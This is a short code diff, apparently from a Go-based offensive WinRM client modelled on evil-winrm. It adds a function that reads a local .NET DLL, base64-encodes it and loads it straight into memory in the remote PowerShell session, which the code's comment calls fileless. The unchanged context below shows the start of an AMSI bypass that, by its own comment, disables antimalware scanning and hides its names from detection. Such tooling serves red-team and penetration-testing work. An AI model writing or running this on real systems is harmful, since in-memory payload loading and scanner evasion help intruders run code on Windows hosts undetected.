@@ -206,6 +206,21 @@ func (c *Client) InvokeBinary(ctx context.Context, local string, args []string) 
 	return c.RunPS(ctx, ps)
 }
 
+// LoadDLL loads a local managed .NET DLL into the session process, like
+// evil-winrm's Dll-Loader. The assembly rides in one command as base64, so it
+// stays fileless, and its public types stay available to later commands in the
+// same session. It returns the exported type names so the caller knows what to
+// invoke next.
+func (c *Client) LoadDLL(ctx context.Context, local string) (string, error) {
+	data, err := os.ReadFile(local)
+	if err != nil {
+		return "", fmt.Errorf("read local file: %w", err)
+	}
+	ps := fmt.Sprintf(`$__d=[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'));'Loaded '+$__d.GetName().Name+', public types:';$__d.GetExportedTypes()|ForEach-Object{'  '+$_.FullName}`,
+		base64.StdEncoding.EncodeToString(data))
+	return c.RunPS(ctx, ps)
+}
+
 // BypassAMSI patches amsiInitFailed in the session process so later commands
 // are not scanned, the same technique evil-winrm's Bypass-4MSI uses. The type
 // and field names are assembled at runtime so the patch command itself is not
